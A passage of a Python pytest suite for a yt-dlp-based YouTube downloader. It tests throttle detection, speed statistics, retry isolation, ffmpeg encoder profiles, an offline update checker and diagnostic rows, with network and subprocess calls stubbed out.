    assert H(1.5 * M, 26 * M, 8, 10 * M, 120) is None           # < 30 MiB -> size-gated out
    assert H(1.5 * M, 26 * M, 8, 200 * M, 5) is None            # < 20 samples -> gated out
    assert H(None, 26 * M, 8, 200 * M, 120) is None             # missing avg -> None
    assert H(1.5 * M, 0, 8, 200 * M, 120) is None               # no peak -> None
    print('test_throttle_hint_fires_only_on_shaping_signature passed')


def test_result_meta_surfaces_throttle_hint():
    """result_meta carries throttle_suspected/throttle_hint to the job card when the shaping signature
    is present, and omits it on a healthy download."""
    dl = YouTubeDownloader(CapabilityDetector(), out_dir='.')
    M = 1024 * 1024
    dl._speed_samples = [1.5 * M] * 120        # sustained ~1.5 MiB/s
    dl._speed_peak = 26 * M                     # but burst hit 26
    dl._speed_hi_count = 8
    dl._last_downloaded_bytes = 200 * M
    meta = dl.result_meta()
    assert meta.get('throttle_suspected') is True
    assert 'shaping' in meta.get('throttle_hint', '') or 'rate cap' in meta.get('throttle_hint', '')
    dl._speed_samples = [15 * M] * 120         # healthy sustained ~15 -> no hint
    assert 'throttle_suspected' not in dl.result_meta()
    print('test_result_meta_surfaces_throttle_hint passed')


def test_speed_stats_peak_is_trim_proof():
    """peak_speed must reconcile with the throttle hint's burst peak: _speed_samples is ring-trimmed
    (oldest dropped) so the start-of-download burst can vanish from max(samples); speed_stats folds in
    the trim-proof _speed_peak so the card's 'peak' can't contradict a 'burst to N MiB/s' hint."""
    from Final.yt_final import YouTubeDownloader
    d = YouTubeDownloader.__new__(YouTubeDownloader)
    M = 1024 * 1024
    d._speed_samples = [1.5 * M, 1.6 * M]        # trimmed steady-state; the burst was dropped
    d._speed_peak = 26 * M                        # trim-proof running max still saw the burst
    stats = YouTubeDownloader.speed_stats(d)
    assert stats['peak_speed'] == 26 * M, stats
    print('test_speed_stats_peak_is_trim_proof passed')


def test_emit_progress_sums_merged_stream_bytes():
    """B3: a merged 137+140 job downloads each stream sequentially; the throttle-hint size gate must
    see the SUM of per-format bytes, not just the largest single stream's max()."""
    from Final.yt_final import YouTubeDownloader
    d = YouTubeDownloader.__new__(YouTubeDownloader)
    d._speed_samples = []
    d.progress_sink = lambda payload: None
    M = 1024 * 1024
    d._emit_progress({'status': 'downloading', 'downloaded_bytes': 20 * M,
                      'info_dict': {'format_id': '137'}})   # video
    d._emit_progress({'status': 'downloading', 'downloaded_bytes': 10 * M,
                      'info_dict': {'format_id': '140'}})   # audio
    assert d._last_downloaded_bytes == 30 * M, d._last_downloaded_bytes
    print('test_emit_progress_sums_merged_stream_bytes passed')


def test_emit_progress_clamps_percent_to_100():
    """percent must never exceed 100 even when total_bytes_estimate undershoots the real bytes (common
    on YouTube DASH), so the web card never shows '103.7%'."""
    from Final.yt_final import YouTubeDownloader
    d = YouTubeDownloader.__new__(YouTubeDownloader)
    d._speed_samples = []
    seen = {}
    d.progress_sink = lambda payload: seen.update(payload)
    d._emit_progress({'status': 'downloading', 'downloaded_bytes': 110, 'total_bytes_estimate': 100})
    assert seen['percent'] == 100.0, seen.get('percent')
    print('test_emit_progress_clamps_percent_to_100 passed')


def test_reset_transfer_stats_zeroes_all_accumulators():
    """B1: _reset_transfer_stats clears every speed accumulator so a slow/failed attempt's samples can't
    survive into a later successful attempt's job-card avg/peak or the throttle hint."""
    from Final.yt_final import YouTubeDownloader
    d = YouTubeDownloader.__new__(YouTubeDownloader)
    d._speed_samples = [1.0, 2.0]
    d._speed_peak = 9.0
    d._speed_hi_count = 3
    d._last_downloaded_bytes = 999
    d._stream_bytes = {'137': 999}
    d._reset_transfer_stats()
    assert d._speed_samples == [] and d._speed_peak == 0.0 and d._speed_hi_count == 0
    assert d._last_downloaded_bytes == 0 and d._stream_bytes == {}
    print('test_reset_transfer_stats_zeroes_all_accumulators passed')


def test_download_retry_isolates_speed_stats_per_attempt(monkeypatch, tmp_path):
    """B1 (OPERATIVE guard): download()'s retry loop must reset the speed accumulators at the TOP of
    each attempt, so a slow FAILED attempt's samples never contaminate the successful attempt's
    job-card avg/peak or the throttle hint. Drives a real retry: attempt 0 transfers slowly then fails
    with a retryable format error; attempt 1 succeeds fast. Without the in-loop _reset_transfer_stats()
    the avg would be the ~13 MiB/s blend of both attempts instead of attempt 1's ~25 MiB/s."""
    import sys, threading
    from types import SimpleNamespace
    import Final.yt_final as yt_final
    M = 1024 * 1024
    out = tmp_path / 'ok.mp4'
    info = {'extractor_key': 'Youtube', 'id': 'x', 'title': 't',
            'formats': [{'format_id': '137', 'vcodec': 'avc1', 'acodec': 'none', 'protocol': 'https'}],
            'requested_formats': [
                {'vcodec': 'avc1', 'acodec': 'none', 'protocol': 'https', 'url': 'https://x/v'},
                {'vcodec': 'none', 'acodec': 'mp4a', 'protocol': 'https', 'url': 'https://x/a'}]}
    holder = {}
    st = {'process': 0, 'extract': 0}

    class FakeYdl:
        def __init__(self, opts):
            self.params = dict(opts)
            self.cookiejar = SimpleNamespace(get_cookie_header=lambda u: None)
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False
        def extract_info(self, url, download=False):
            st['extract'] += 1
            return dict(info)
        def prepare_filename(self, i):
            return str(out)
        def process_ie_result(self, i, download=True):
            st['process'] += 1
            d = holder['d']
            if st['process'] == 1:                       # attempt 0: slow, then a retryable failure
                for _ in range(30):
                    d._emit_progress({'status': 'downloading', 'downloaded_bytes': 2 * M,
                                      'speed': 1.0 * M, 'info_dict': {'format_id': '137'}})
                raise Exception('ERROR: Requested format is not available')
            for _ in range(30):                          # attempt 1: fast, success
                d._emit_progress({'status': 'downloading', 'downloaded_bytes': 50 * M,
                                  'speed': 25.0 * M, 'info_dict': {'format_id': '137'}})
            out.write_bytes(b'media')
            r = dict(i)
            r['filepath'] = str(out)
            r['requested_downloads'] = [{'filepath': str(out)}]
            return r

    monkeypatch.setitem(sys.modules, 'yt_dlp',
                        SimpleNamespace(YoutubeDL=FakeYdl, utils=SimpleNamespace(ExtractorError=Exception)))
    monkeypatch.setattr(yt_final, 'guard_reserved_uploader_dir', lambda *a, **k: None)

    d = yt_final.YouTubeDownloader.__new__(yt_final.YouTubeDownloader)
    d.output_path = tmp_path
    d.detector = SimpleNamespace(ffmpeg_path='ffmpeg')
    d.history = []
    d.last_info = {}
    d._tls = threading.local()
    d.progress_sink = lambda payload: None
    d._get_cookie_manager = lambda: None
    d._log_quality = lambda i: None
    d._hybrid_pick_after_extract = lambda *a, **k: ('builtin', None)
    d.get_optimized_ydl_opts = lambda *a, **k: {'_engine_policy': 'builtin', 'progress_hooks': []}
    holder['d'] = d

    result = d.download('https://youtu.be/x')
    assert result == [out], result
    assert st['extract'] == 2 and st['process'] == 2, st      # attempt 0 failed, attempt 1 retried
    avg = d.speed_stats()['avg_speed']
    assert abs(avg - 25 * M) < 1024, avg / M                  # attempt 1 only; a missing reset -> ~13
    print('test_download_retry_isolates_speed_stats_per_attempt passed')


def test_error_message_specific_cause_beats_cookie_latch():
    """A specific final cause (format/bot/age) wins over the browser-cookie-load hint: if browser
    cookies failed on attempt 0 but the job ultimately died on a format problem, the user is told the
    FORMAT fix — not the wrong 'close Chrome' message (browser_cookie_failed latch hijack)."""
    from Final.yt_final import YouTubeDownloader
    msg = YouTubeDownloader._download_error_message(
        'ERROR: Requested format is not available', 'chrome', True)   # latch set, but final=format
    assert 'format' in msg.lower() and 'chrome' not in msg.lower(), msg
    # a genuine cookie-DB final failure with no more-specific cause STILL gets the cookie hint
    msg2 = YouTubeDownloader._download_error_message(
        'Failed to decrypt cookie database', 'chrome', True)
    assert 'chrome' in msg2.lower(), msg2
    print('test_error_message_specific_cause_beats_cookie_latch passed')


def test_next_opts_on_error_retries_transient_network():
    """A transient network error (reset/timeout during the brief extraction burst) must re-extract via
    the outer loop (return opts), not hard-fail (None) — extractor_retries is cut to 1 on the premise
    that this loop retries. Mirrors the ratelimit branch; opts unchanged, no backoff."""
    from Final.yt_final import FinalYouTubeGPUEngine
    dl = FinalYouTubeGPUEngine(output_dir='.').downloader
    base = {'format': 'bv*+ba/best', 'progress_hooks': ['h']}
    for msg in ('Connection reset by peer', 'Read timed out', 'temporary failure in name resolution'):
        out = dl._next_opts_on_error(msg, 0, base)
        assert out is not None, f'planner hard-failed a transient network error: {msg!r}'
        assert out.get('format') == 'bv*+ba/best'
    print('test_next_opts_on_error_retries_transient_network passed')


def test_download_with_priority_propagates_cancel():
    """A cooperative cancel must escape the speed-priority fallback loop, not be swallowed as a
    'fallback failed' and drop to a lower quality (which would ignore the cancel and can hit another
    60s rate-limit wait). Regression guard for the widened-window cancel-swallow."""
    from Final.yt_final import DownloadCancelled
    dl = YouTubeDownloader(CapabilityDetector(), out_dir='.')
    calls = []
    def _cancel_download(*a, **k):
        calls.append(1)
        raise DownloadCancelled('YT_FINAL_CANCEL')
    dl.download = _cancel_download
    raised = False
    try:
        dl._download_with_priority('https://www.youtube.com/watch?v=cancel_test', 'best')
    except DownloadCancelled:
        raised = True
    assert raised, 'cancel must propagate out of the fallback loop'
    assert len(calls) == 1, 'must stop at the first cancel, not try lower fallback qualities'
    print('test_download_with_priority_propagates_cancel passed')


def test_format_selector_prefers_h264_and_caps():
    """Smart 1080p H.264 default: cap honored + avc1 preferred; codec switches work."""
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    f1080 = dl._build_format_selector('1080p', 'h264')
    assert 'height<=1080' in f1080 and 'avc1' in f1080
    fav1 = dl._build_format_selector('best', 'av1')
    assert 'av01' in fav1
    fvp9 = dl._build_format_selector('720p', 'vp9')
    assert 'vp9' in fvp9 and 'height<=720' in fvp9
    fa = dl._build_format_selector('audio', None)
    assert 'bestaudio' in fa
    # default codec is h264
    assert 'avc1' in dl._build_format_selector('1080p', None)
    print('test_format_selector_prefers_h264_and_caps passed')


def test_optimized_opts_native_and_collision_safe():
    """Native -N is set, overwrites disabled (collision-safe), aria2c (if any) restricted to http."""
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    opts = dl.get_optimized_ydl_opts('1080p', codec='h264')
    assert opts['concurrent_fragment_downloads'] >= 8
    assert opts['overwrites'] is False
    assert 'throttledratelimit' in opts
    ed = opts.get('external_downloader')
    # If aria2c present it must be a protocol dict (http only), never a bare 'aria2c' for all protocols
    if ed is not None:
        assert isinstance(ed, dict) and 'http' in ed and 'm3u8' not in ed
    print('test_optimized_opts_native_and_collision_safe passed')


def test_unique_path_avoids_collision(tmpfile='._collide_test.mp4'):
    from pathlib import Path
    p = Path(tmpfile)
    try:
        p.write_text('x')
        u = YouTubeDownloader._unique_path(p)
        assert u != p and u.name == '._collide_test (1).mp4'
        # a path that doesn't exist is returned unchanged
        assert YouTubeDownloader._unique_path(Path('._does_not_exist_xyz.mp4')).name == '._does_not_exist_xyz.mp4'
    finally:
        if p.exists():
            p.unlink()
    print('test_unique_path_avoids_collision passed')


def test_new_encoder_profiles_present_and_build():
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    for key in ('nvenc_av1_fast', 'nvenc_h265_quality', 'amf_hevc', 'qsv_h264',
                'cpu_h265', 'cpu_av1', 'prores_hq', 'dnxhr_hqx', 'copy_mkv'):
        assert key in proc.profiles, f'missing profile {key}'

    def S(name):
        return ' '.join(proc.build_ffmpeg_command('in.mp4', 'out' + proc.output_ext(name), name))

    av1 = S('nvenc_av1_fast')
    assert 'av1_nvenc' in av1 and '-preset p2' in av1
    h265 = S('nvenc_h265_quality')
    assert 'hevc_nvenc' in h265 and 'p010le' in h265 and '-tag:v hvc1' in h265
    pr = S('prores_hq')
    assert 'prores_ks' in pr and '-qscale:v 9' in pr and 'yuv422p10le' in pr and '+faststart' not in pr
    dn = S('dnxhr_hqx')
    assert 'dnxhd' in dn and 'dnxhr_hqx' in dn and 'yuv422p10le' in dn
    x265 = S('cpu_h265')
    assert 'libx265' in x265 and '-crf 20' in x265 and '-tag:v hvc1' in x265
    amf = S('amf_hevc')
    assert 'hevc_amf' in amf and '-quality quality' in amf
    qsv = S('qsv_h264')
    assert 'h264_qsv' in qsv and '-global_quality 22' in qsv
    print('test_new_encoder_profiles_present_and_build passed')


def test_output_ext_mapping():
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    assert proc.output_ext('prores_hq') == '.mov'
    assert proc.output_ext('dnxhr_hqx') == '.mov'
    assert proc.output_ext('cpu_av1') == '.mkv'
    assert proc.output_ext('copy_mkv') == '.mkv'
    assert proc.output_ext('nvenc_av1_fast') == '.mp4'
    assert proc.output_ext('premiere_h264_fast') == '.mp4'
    print('test_output_ext_mapping passed')


def test_bufsize_unit_handling():
    assert FFmpegProcessor._bitrate_to_bufsize('5M') == '10000k'
    assert FFmpegProcessor._bitrate_to_bufsize('800k') == '1600k'
    # bufsize appears in nvenc command when a bitrate cap is set
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    cmd = ' '.join(proc.build_ffmpeg_command('in.mp4', 'out.mp4', 'premiere_h264_fast'))
    assert '-bufsize 10000k' in cmd
    print('test_bufsize_unit_handling passed')


def test_download_returns_empty_on_failure_no_fabrication():
    """The fake-success fabrication (thumbnail/empty file named s0DohADRRlY) must be gone:
    a hard failure returns [] and creates no file."""
    from pathlib import Path
    import glob as _glob
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    before = set(_glob.glob('*s0DohADRRlY*'))
    # The global StubYDL has no context-manager protocol -> raises a generic (non-retryable) error.
    res = dl.download('https://www.youtube.com/watch?v=s0DohADRRlY')
    assert res == [], f'expected [] on failure, got {res}'
    after = set(_glob.glob('*s0DohADRRlY*'))
    assert before == after, 'download() must not fabricate placeholder files'
    print('test_download_returns_empty_on_failure_no_fabrication passed')


def test_no_external_downloader_for_dash():
    """Regression: aria2c must NOT be registered as external_downloader — yt-dlp routes https DASH
    (itag 137) through the 'http' downloader key, so {'http': aria2c} would replace native -N and cap speed."""
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    for q in ('1080p', 'best', '4k', 'audio'):
        opts = dl.get_optimized_ydl_opts(q, codec='h264')
        assert opts.get('external_downloader') in (None, {}), \
            f"external_downloader must be unset (got {opts.get('external_downloader')})"
        assert opts['concurrent_fragment_downloads'] >= 16, opts['concurrent_fragment_downloads']
    # 1080p must use the high concurrency tier
    assert dl.get_optimized_ydl_opts('1080p')['concurrent_fragment_downloads'] == 32
    print('test_no_external_downloader_for_dash passed')


def test_clients_lead_with_android_vr():
    """Regression: a direct-HTTPS-DASH fast-path client must lead each list, and no SABR/403 client
    (android, ios, tv, web) may precede it. BOTH lists now lead with android_vr — measured 2026-07-20
    it returns nsig-solved `n=` URLs at ~39 MiB/s with NO PO token and best survival; mweb (needs PO)
    hit fresh-URL 403 instability and is retained as the WITH_POT fallback."""
    assert YouTubeDownloader.CLIENTS_NO_POT[0] == 'android_vr'
    assert YouTubeDownloader.CLIENTS_WITH_POT[0] == 'android_vr'
    assert 'mweb' in YouTubeDownloader.CLIENTS_WITH_POT  # PO-token path retained as fallback
    _sabr = ('android', 'ios', 'tv', 'web')
    assert YouTubeDownloader.CLIENTS_NO_POT[0] not in _sabr
    assert YouTubeDownloader.CLIENTS_WITH_POT[0] not in _sabr
    print('test_clients_lead_with_android_vr passed')


def test_update_version_compare():
    """UpdateChecker version compare handles date-based (yt-dlp) and semver (bgutil) correctly."""
    try:
        from Final.yt_final import UpdateChecker as U
    except ImportError:
        from yt_final import UpdateChecker as U
    assert U._ver_tuple('2026.06.09') == (2026, 6, 9)
    assert U._ver_tuple('1.3.1') == (1, 3, 1)
    assert U._outdated('2026.06.09', '2026.07.01') is True      # date newer
    assert U._outdated('2026.06.09', '2026.06.09') is False     # equal
    assert U._outdated('1.3.1', '1.3.0') is False               # older latest (shouldn't happen)
    assert U._outdated('0.8.0', '0.9.0') is True                # semver newer
    assert U._outdated(None, '1.0.0') is False                  # not installed -> not "outdated"
    assert U._outdated('(not running)', '1.3.1') is False
    assert U._outdated('0.6.0', '0.6.0-beta') is False
    print('test_update_version_compare passed')


def test_optional_latest_versions_use_packaged_manifest_without_network(monkeypatch):
    """Certified latest versions are packaged data, replacing the former mutable TTL lookups."""
    import urllib.request
    from Final.yt_final import UpdateChecker as U

    def forbidden_network(*_args, **_kwargs):
        raise AssertionError('optional latest discovery must not use the network')

    monkeypatch.setattr(urllib.request, 'urlopen', forbidden_network)

    assert U._optional_latest_version(
        'node', platform_name='win32', architecture='AMD64') == '24.18.0'
    assert U._optional_latest_version(
        'node', platform_name='darwin', architecture='arm64') == '24.18.0'
    assert U._optional_latest_version(
        'deno', platform_name='win32', architecture='x64') == '2.9.4'
    assert U._optional_latest_version(
        'deno', platform_name='darwin', architecture='aarch64') == '2.9.4'

    for manual_only in (
        'aria2c',
        'N_m3u8DL-RE',
        'bgutil-server',
        'playwright',
    ):
        assert U._optional_latest_version(
            manual_only,
            platform_name='win32',
            architecture='x86_64',
        ) is None
    assert U._optional_latest_version(
        'node', platform_name='linux', architecture='x86_64') is None


def test_update_scan_uses_manifest_latest_and_keeps_uncertified_tools_manual(
        monkeypatch):
    """The report has certified Node/Deno versions and no remote latest for manual tools."""
    import platform as py_platform
    import urllib.request
    from Final import optional_tools
    from Final import yt_final as Y

    def forbidden_network(*_args, **_kwargs):
        raise AssertionError('optional latest discovery must not use the network')

    monkeypatch.setattr(urllib.request, 'urlopen', forbidden_network)
    monkeypatch.setattr(Y._sys, 'platform', 'win32')
    monkeypatch.setattr(py_platform, 'machine', lambda: 'AMD64')
    monkeypatch.setattr(Y.UpdateChecker, '_ensure_managed_imports',
                        staticmethod(lambda: None))
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_package_probe',
        classmethod(lambda cls, _name: {
            'version': None,
            'verified': False,
            'source': None,
        }),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_pypi_latest',
        classmethod(lambda cls, _name, timeout=3: '99.0'),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_cmd_first_line',
        staticmethod(lambda *_args, **_kwargs: None),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_ffmpeg_release_latest',
        classmethod(lambda cls: '8.1.2'),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_resolve_js_runtime',
        classmethod(lambda cls, name: {
            'path': f'C:\\tools\\{name}.exe',
            'version': '24.0.0' if name == 'node' else '2.8.0',
            'verified': False,
            'source': 'system-path',
        }),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_bgutil_server_version',
        staticmethod(lambda _base: None),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_installed',
        staticmethod(lambda _name: None),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_probe_playwright',
        classmethod(lambda cls: {
            'version': '1.0',
            'importable': True,
            'chromium': True,
        }),
    )
    monkeypatch.setattr(Y.YouTubeDownloader, '_find_aria2c', lambda _self: None)
    monkeypatch.setattr(Y.YouTubeDownloader, '_find_n_m3u8dl', lambda _self: None)
    monkeypatch.setattr(optional_tools, 'find_bgutil_script_path', lambda: None)

    report = Y.UpdateChecker._scan_uncached(
        check_pypi=True,
        ffmpeg_path='missing-ffmpeg',
        include_optional_tools=True,
    )
    info = {row['name']: row for row in report['info']}

    assert info['node']['latest'] == '24.18.0'
    assert info['deno']['latest'] == '2.9.4'
    assert info['node']['installable'] is True
    assert info['deno']['installable'] is True
    for manual_only in (
        'aria2c',
        'N_m3u8DL-RE',
        'bgutil-server',
        'playwright',
    ):
        assert info[manual_only]['latest'] is None
        assert info[manual_only]['installable'] is False
        assert info[manual_only]['updatable'] is False


@pytest.mark.parametrize(
    ('platform_name', 'architecture'),
    [
        ('linux', 'x86_64'),
        ('darwin', 'x86_64'),
        ('win32', 'arm64'),
    ],
)
def test_update_scan_disables_node_and_deno_install_on_uncertified_host(
        monkeypatch, platform_name, architecture):
    """No approved manifest row means no managed runtime mutation may be offered."""
    import platform as py_platform
    from Final import optional_tools
    from Final import yt_final as Y

    monkeypatch.setattr(Y._sys, 'platform', platform_name)
    monkeypatch.setattr(py_platform, 'machine', lambda: architecture)
    monkeypatch.setattr(Y.UpdateChecker, '_ensure_managed_imports',
                        staticmethod(lambda: None))
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_package_probe',
        classmethod(lambda cls, _name: {
            'version': None,
            'verified': False,
            'source': None,
        }),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_cmd_first_line',
        staticmethod(lambda *_args, **_kwargs: None),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_ffmpeg_release_latest',
        classmethod(lambda cls: None),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_resolve_js_runtime',
        classmethod(lambda cls, _name: {
            'path': None,
            'version': None,
            'verified': False,
            'source': 'missing',
        }),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_bgutil_server_version',
        staticmethod(lambda _base: None),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_installed',
        staticmethod(lambda _name: None),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_probe_playwright',
        classmethod(lambda cls: {
            'version': None,
            'importable': False,
            'chromium': False,
        }),
    )
    monkeypatch.setattr(optional_tools, 'find_bgutil_script_path', lambda: None)

    report = Y.UpdateChecker._scan_uncached(
        check_pypi=False,
        ffmpeg_path='missing-ffmpeg',
        include_optional_tools=False,
    )
    info = {row['name']: row for row in report['info']}

    assert info['node']['latest'] is None
    assert info['deno']['latest'] is None
    assert info['node']['installable'] is False
    assert info['deno']['installable'] is False


def test_update_scan_offline_structure():
    """scan(check_pypi=False) is read-only, hits no network, and returns the expected shape."""
    from Final.yt_final import UpdateChecker as U
    rep = U.scan(check_pypi=False)
    assert {'pip', 'info', 'warnings'} <= set(rep.keys())
    names = [p['name'] for p in rep['pip']]
    assert 'yt-dlp' in names and 'bgutil-ytdlp-pot-provider' in names
    for p in rep['pip']:
        assert p['latest'] is None and p['outdated'] is False   # check_pypi=False => no remote, never flagged
    info_names = [i['name'] for i in rep['info']]
    assert 'ffmpeg' in info_names and 'node' in info_names
    print('test_update_scan_offline_structure passed')


def test_update_checker_never_executes_unproven_managed_interpreter(
        monkeypatch):
    """Legacy venv probes are inert compatibility stubs."""
    from Final import yt_final as Y

    def candidate_executed(*_args, **_kwargs):
        raise BaseException('managed candidate interpreter was executed')

    monkeypatch.setattr(Y.subprocess, 'run', candidate_executed)

    assert Y.UpdateChecker._venv_metadata_version('yt-dlp') is None
    assert Y.UpdateChecker._venv_imports_ok('yt-dlp') is False


@pytest.mark.parametrize("all_flag", [False, True])
@pytest.mark.parametrize("assume_yes", [False, True])
def test_cli_python_update_freeze_precedes_guard_scan_prompt_and_process_io(
        monkeypatch, capsys, all_flag, assume_yes):
    """The compatibility command exits cleanly before every side effect."""
    import builtins
    from Final import managed_env
    from Final import yt_final as Y

    class SideEffectReached(BaseException):
        pass

    def forbidden(*_args, **_kwargs):
        raise SideEffectReached('frozen CLI update reached side-effecting code')

    monkeypatch.setattr(Y, 'installer_guard', forbidden)
    monkeypatch.setattr(
        Y.UpdateChecker,
        'scan',
        classmethod(lambda cls, **_kwargs: forbidden()),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        'print_report',
        classmethod(lambda cls, _report: forbidden()),
    )
    monkeypatch.setattr(Y.subprocess, 'run', forbidden)
    monkeypatch.setattr(builtins, 'input', forbidden)

    with pytest.raises(SystemExit) as raised:
        Y.UpdateChecker.run_update(
            all_=all_flag,
            assume_yes=assume_yes,
        )

    public = capsys.readouterr().out.strip()
    assert raised.value.code == 1
    assert public == (
        'Certified Python update unavailable: '
        + managed_env.CERTIFIED_RUNTIME_UNAVAILABLE_MESSAGE
    )


def test_interactive_update_is_report_only_before_scan_or_mutation(
        monkeypatch, capsys):
    """Menu option 10 must return normally without starting the retired updater."""
    import builtins
    from Final import managed_env
    from Final import yt_final as Y

    class SideEffectReached(BaseException):
        pass

    def forbidden(*_args, **_kwargs):
        raise SideEffectReached('interactive update reached retired updater code')

    monkeypatch.setattr(
        Y.UpdateChecker,
        'scan',
        classmethod(lambda cls, **_kwargs: forbidden()),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        'print_report',
        classmethod(lambda cls, _report: forbidden()),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        'run_update',
        classmethod(lambda cls, **_kwargs: forbidden()),
    )
    prompts = []
    monkeypatch.setattr(
        builtins,
        'input',
        lambda prompt='': prompts.append(prompt) or '',
    )

    Y._check_updates_interactive()

    output = capsys.readouterr().out
    assert managed_env.CERTIFIED_RUNTIME_UNAVAILABLE_MESSAGE in output
    assert 'future reviewed release' in output
    assert prompts == ['\nPress Enter to return to menu...']
    assert 'Apply these updates now?' not in output


def test_update_help_truthfully_describes_reviewed_release_freeze(
        monkeypatch, capsys):
    from Final import yt_final as Y

    monkeypatch.setattr(Y._sys, 'argv', ['yt_final.py', 'update', '--help'])

    with pytest.raises(SystemExit) as raised:
        Y.main()

    help_text = ' '.join(capsys.readouterr().out.split())
    assert raised.value.code == 0
    assert 'future reviewed release' in help_text
    for obsolete in (
        'Apply available updates',
        'Refresh all pip components',
        'Skip the confirmation prompt',
    ):
        assert obsolete not in help_text


def test_diagnose_structure():
    """build_diagnose_result(check_pypi=False) returns well-formed rows and hits no network."""
    from Final.yt_final import build_diagnose_result
    rows = build_diagnose_result(CapabilityDetector(), check_pypi=False)
    assert isinstance(rows, list) and rows
    for r in rows:
        assert set(r.keys()) == {'name', 'status', 'detail', 'fix'}
        assert r['status'] in {'pass', 'warn', 'fail'}
    names = {r['name'] for r in rows}
    expected = {'Python', 'ffmpeg', 'ffprobe', 'yt-dlp', 'HTTP transport', 'JS runtime', 'PO-token', 'HW encoders'}
    assert expected <= names, f"missing rows: {expected - names}"
    print('test_diagnose_structure passed')


def test_diagnose_python_row_passes():
    """The test environment satisfies the package contract (Python >=3.11)."""
    from Final.yt_final import build_diagnose_result
    rows = build_diagnose_result(CapabilityDetector(), check_pypi=False)
    py = next(r for r in rows if r['name'] == 'Python')
    assert py['status'] == 'pass'
    print('test_diagnose_python_row_passes passed')


def test_diagnose_does_not_implicitly_discover_bgutil_script(
        monkeypatch, tmp_path):
    """A certified JS runtime does not authorize an unreviewed local script."""
    import urllib.request
    from Final import optional_tools
    from Final import yt_final as Y

    script = tmp_path / 'bgutil' / 'server' / 'build' / 'generate_once.js'
    script.parent.mkdir(parents=True)
    script.write_text('// fixture', encoding='utf-8')
    managed_node = tmp_path / 'tools' / 'node' / 'versions' / 'certified' / 'node.exe'

    monkeypatch.setattr(optional_tools, 'find_bgutil_script_path', lambda: script)
    monkeypatch.setattr(
        urllib.request,
        'urlopen',
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            OSError('provider is not running')
        ),
    )
    monkeypatch.setattr(Y.shutil, 'which', lambda _name: None)
    monkeypatch.setattr(
        Y,
        '_js_runtime_execution_path',
        lambda name: str(managed_node) if name == 'node' else None,
    )
    monkeypatch.setattr(
        Y.YouTubeDownloader,
        '_runtime_version',
        staticmethod(lambda executable: (24, 18, 0)
                     if executable == str(managed_node) else None),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_installed',
        staticmethod(lambda _name: '9999.0.0'),
    )

    rows = Y.build_diagnose_result(CapabilityDetector(), check_pypi=False)
    js_row = next(row for row in rows if row['name'] == 'JS runtime')
    pot_row = next(row for row in rows if row['name'] == 'PO-token')

    assert js_row['status'] == 'pass'
    assert 'node 24.18.0' in js_row['detail']
    assert pot_row['name'] == 'PO-token'
    assert pot_row['status'] == 'warn'
    assert 'no provider reachable' in pot_row['detail']
    assert 'manual' in pot_row['fix'].lower()
    assert 'provenance' in pot_row['fix'].lower()


def test_runtime_guidance_is_certified_and_provenance_aware(
        monkeypatch, tmp_path):
    """Missing bgutil guidance must not advertise mutable implicit-tag setup."""
    import urllib.request
    from Final import optional_tools
    from Final import yt_final as Y

    monkeypatch.setattr(optional_tools, 'find_bgutil_script_path', lambda: None)
    monkeypatch.setattr(
        urllib.request,
        'urlopen',
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            OSError('provider is not running')
        ),
    )
    monkeypatch.setattr(Y, '_js_runtime_execution_path', lambda _name: None)
    monkeypatch.setattr(Y.shutil, 'which', lambda _name: None)
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_installed',
        staticmethod(lambda _name: '9999.0.0'),
    )

    rows = Y.build_diagnose_result(CapabilityDetector(), check_pypi=False)
    guidance = next(row for row in rows if row['name'] == 'PO-token')['fix']
    source = Path(Y.__file__).read_text(encoding='utf-8')

    assert 'manual' in guidance.lower()
    assert 'provenance' in guidance.lower()
    assert 'verified node or deno' in guidance.lower()
    assert 'certified python set' not in guidance.lower()
    assert 'future reviewed yt_final release' in source
    assert 'docker run' not in guidance.lower()
    assert 'docker run -d' not in source
    assert 'yt-dlp[default]' not in source


def test_diagnose_python_floor_rejects_3_10_and_accepts_3_11(monkeypatch):
    """Diagnose enforces the same Python >=3.11 floor declared by release metadata."""
    from collections import namedtuple
    from Final import yt_final as Y

    fake_version_info = namedtuple('fake_version_info', 'major minor micro')
    monkeypatch.setattr(Y.UpdateChecker, '_installed', staticmethod(lambda _name: '99.0'))
    expected_rows = [
        (
            (3, 10, 14),
            {
                'name': 'Python',
                'status': 'fail',
                'detail': 'Python 3.10.14 is too old; requires >=3.11',
                'fix': 'Install Python 3.11 or newer.',
            },
        ),
        (
            (3, 11, 0),
            {'name': 'Python', 'status': 'pass', 'detail': 'Python 3.11.0', 'fix': ''},
        ),
    ]

    for version_parts, expected in expected_rows:
        monkeypatch.setattr(Y._sys, 'version_info', fake_version_info(*version_parts))
        rows = Y.build_diagnose_result(CapabilityDetector(), check_pypi=False)
        assert next(row for row in rows if row['name'] == 'Python') == expected


